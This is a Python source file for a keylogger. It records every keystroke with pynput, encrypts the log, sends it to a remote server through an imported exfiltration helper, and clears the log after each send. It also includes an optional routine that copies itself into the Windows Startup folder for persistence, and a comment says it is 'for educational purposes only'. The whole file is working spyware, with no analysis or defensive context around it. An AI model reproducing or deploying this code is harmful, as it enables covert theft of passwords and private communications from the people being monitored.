from pynput import keyboard
from encryptor import encrypt_data
from exfiltrate import send_to_server
from datetime import datetime
import os
import shutil

log_file = "logs/keystrokes.log"
os.makedirs("logs", exist_ok=True)

def add_to_startup():
    filename = os.path.basename(__file__)
    dest = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", filename)
    try:
        shutil.copy(__file__, dest)
    except:
        pass  # For educational purposes only

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {key}\n")

    with open(log_file, "r") as f:
        content = f.read()
    if len(content) > 20:
        encrypted = encrypt_data(content)
        send_to_server(encrypted)
        open(log_file, "w").close()  # Clear log

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Optional: Uncomment to add to startup
# add_to_startup()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
